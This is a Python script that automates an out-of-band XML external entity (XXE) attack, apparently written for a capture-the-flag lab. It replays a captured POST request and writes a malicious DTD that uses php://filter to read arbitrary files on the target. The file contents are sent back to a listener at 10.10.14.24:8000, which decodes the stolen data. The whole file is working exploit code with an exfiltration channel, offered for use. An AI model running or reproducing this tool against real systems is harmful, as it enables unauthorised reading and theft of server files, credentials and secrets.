import argparse
import requests
import http.server
import socketserver
import threading
import base64
from urllib.parse import urlparse, parse_qs

def parse_post_req(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    headers = {}
    Path={}
    body = ''
    is_body = False
    request_line = lines[0].strip()
    if request_line.startswith('POST'):
        Path['POST /api'] = request_line.split(' ', 2)[1]
    for line in lines[1:]:
        line = line.strip()
        if line == '':
            is_body = True
            continue
        if is_body:
            body += line
        elif ':' in line:
            key, value = line.split(': ', 1)
            headers[key] = value
        else:
            print(f'Warning: Ignoring line "{line}" as it does not follow the "key: value" format.')
    return headers, body, Path
    
def prompt_user():
    substitution = input("xxe> ")
    return substitution

def update_dtd_file(substitution):
    content = f"<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource={substitution}'>\n"
    content += f"<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.24:8000/?x=%file;'>\">\n"
    content += "%eval;\n"
    content += "%exfiltrate;"
    with open("m.dtd", "w") as file:
        file.write(content)
    print("File 'm.dtd' updated successfully.")

def start_web_server():
    Handler = CustomHandler
    httpd = socketserver.TCPServer(("", 8000), Handler)
    print("[+] Hosting malicious.dtd on port 8000.")
    httpd.serve_forever()

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        if 'x' in query_params:
            x_value = query_params['x'][0]
            x_value = x_value.replace(' ', '+')
            try:
                decoded_value = base64.b64decode(x_value).decode('utf-8')
                print(f'[+] Decoded value: {decoded_value}')
            except base64.binascii.Error:
                print('Invalid base64-encoded string:', x_value)

        super().do_GET()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Parse post.req file')
    parser.add_argument('-r', '--req-file', type=str, help='Path to post.req file')
    args = parser.parse_args()
    if args.req_file:
        headers, body, Path = parse_post_req(args.req_file)
        if 'Host' not in headers:
            print('[-] Invalid post.req file. Missing required Host header.')
            exit(1)
        host = headers['Host']
        path = Path.get('POST /api')
        if host and path:
            url = f'http://{host}{path}'
            # Start the web server in a separate thread
            web_server_thread = threading.Thread(target=start_web_server)
            web_server_thread.start()
            while True:
                substitution = prompt_user()
                update_dtd_file(substitution)
                try:
                    print('\nSending POST request to:', url)
                    response = requests.post(url, headers=headers, data=body)
                except KeyboardInterrupt:
                    print("Keyboard interrupt detected. Exiting...")
                    break
        else:
            print('[-] Invalid post.req file. Missing required headers.')
    else:
        print('[-] Please provide the path to the post.req file using the -r or --req-file option.')
    # Wait for the web server thread to finish
    web_server_thread.join()
